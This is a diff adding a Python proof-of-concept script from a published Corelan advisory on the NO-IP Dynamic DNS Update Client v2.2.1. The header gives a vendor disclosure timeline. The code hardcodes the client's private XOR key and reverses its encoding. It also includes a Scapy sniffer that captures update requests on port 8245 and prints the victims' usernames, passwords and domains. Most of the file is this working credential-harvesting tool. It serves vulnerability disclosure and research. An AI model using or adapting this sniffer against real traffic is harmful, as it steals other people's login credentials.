@@ -1,0 +1,140 @@
+#!/usr/bin/python
+
+"""
+|------------------------------------------------------------------|
+|                         __               __                      |
+|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+|                                                                  |
+|                                       http://www.corelan.be:8800 |
+|                                              security@corelan.be |
+|                                                                  |
+|-------------------------------------------------[ EIP Hunters ]--|
+
+NO-IP.com Dynamic DNS Update Client (DUC) v2.2.1 Request Decoder
+http://www.corelan.be:8800/advisories.php?id=CORELAN-10-052
+by: sinn3r
+http://twitter.com/_sinn3r
+Software Tested on: Windows XP SP3 ENG (victim) + BT4 Final (attacker)
+Greetz: Corelan Security Team & Offensive Security Exploit Database Team
+Special thanks to: Kurt from no-ip.com
+
+Description:
+DUC is a dynamic DNS update client that continually checks for IP changes in the
+background and automataically updates the DNS at NO-IP via HTTP. The username,
+password, and domain name can be decoded thus making the user more vulnerable to
+MITM attacks.  We encourage v2 users to upgrade to v3 for this particular reason:
+http://www.no-ip.com/downloads.php?page=win3
+
+Timeline:
+03/10/2010 - Vendor Contacted.
+03/19/2010 - Contacting the vendor again.
+03/20/2010 - Initial response from vendor
+03/25/2010 - Requesting for a patch update
+03/26/2010 - Vendor replies, no update yet.
+03/31/2010 - Requesting for a patch date again.
+04/01/2010 - Vendor tells us they plan to release v3 on 4/15/2010.
+04/17/2010 - v3 final delayed. Requesting for another update.
+04/19/2010 - Vendor sets v3 release date to 4/27/2010.  Proof of concept delivered.
+04/27/2010 - v3 final delayed.
+05/12/2010 - Requesting for another update.
+05/18/2010 - Vendor sets v3 release date to 6/02/2010.
+06/02/2010 - v3 final delayed.
+06/12/2010 - Requesting final deadline.
+06/22/2010 - Vendor releases v3
+"""
+
+import base64
+import re
+from scapy.all import *
+
+def decode(enc_request):
+	"""
+	The custom encoder consists of 3 stages:
+	1. Rearrange the request string in reverse	(find the code at 0x00470259)
+	2. XOR the reversed string with a private key	(find the code at 0x0046F868)
+	3. Base64 the XOR'd string			(find the code at 0x004706D0)
+	"""
+	private_key = "9ICybvm/nqBpiSo0x8KNVBlZ1Ad96+8fPRHtX4+zBBuV00c"
+	private_key_length = len(private_key)
+
+	## 1st Stage: Base64 Decoder
+	stage1 = base64.decodestring(enc_request)
+
+	## 2nd Stage: The custom XOR algorithm
+	stage2 = []
+	counter = 0
+	for byte in stage1:
+		hex_byte  = byte.encode("hex")			#XOR key
+		hex_value = private_key[counter].encode("hex")	#Value
+		int_byte  = int(hex_byte, 16)			#Convert hex to int for XOR
+		int_value = int(hex_value, 16)			#Convert hex to int for XOR
+		xor = int_value ^ int_byte
+		xor_char = chr(xor)
+		stage2.append(xor_char)
+		if counter >= private_key_length-1:
+			counter = 0
+		else:
+			counter += 1
+
+	## 3rd stage: Reverse order
+	stage2.reverse()
+	stage3 = "".join(stage2)
+	return stage3	#Secret
+
+def callback(pkt):
+	"""
+	The callback function for the scapy sniffer
+	filter="tcp and port 8245"
+	"""
+	raw = pkt.sprintf("%Raw.load%")
+	m = re.search("\?request=[a-zA-Z0-9=]+ ", raw)
+	if m != None:
+		encoded_request = m.group(0)
+		encoded_request = encoded_request.replace("?request=", "")
+		tmp = decode(encoded_request.strip())
+		secret = format(tmp)
+		print "[*] I smell password!"
+		print "%s\n" %secret
+
+def format(data):
+	"""
+	Modify the display format for your viewing pleasure
+	"""
+	data = data.replace("&", "\n")
+	data = data.replace("pass=", "password=")
+	data = data.replace("h[]=", "domain=")
+	return data
+
+if __name__ == "__main__":
+	try:
+		print "|---------------------------------------------------------------|"
+		print "|  NO-IP.com Domain Update Client (DUC) v2.2.1 Request Decoder  |"
+		print "|  Coded by sinn3r                         twitter.com/_sinn3r  |"
+		print "|---------------------------------------------------------------|\r\n"
+
+		print "Mode 1: Basic    (Use wireshark to sniff the string on port 8245 first)"
+		print "Mode 2: Sniffer  (Forward the traffic to this machine first.)\n"
+		mode = raw_input("Select mode [1]: ")
+
+		## Basic Mode
+		if mode == "1":
+			#Listen on port 8245 with Wireshark to grab the REQUEST string
+			#Example: "WCEiEQMeGEJTAjERGXUCXxsWPz0zNiwuQiQQBFpCWQs1"
+			encoded_request = raw_input("Encoded string: ")
+			if encoded_request != "":
+				tmp = decode(encoded_request)
+				secret = format(tmp)
+				print secret
+		## Sniffer Mode
+		elif mode == "2":
+			print "[*] Sniffing for NO-IP traffic on port 8245..."
+			print "[*] Press [CTRL] + [C] to stop sniffing.\n"
+			sniffer = sniff(filter="tcp and port 8245", prn=callback)
+		else:
+			print "[*] Que?"
+	except KeyboardInterrupt:
+		print "\r\n[*] Good bye"
+		sys.exit(0)
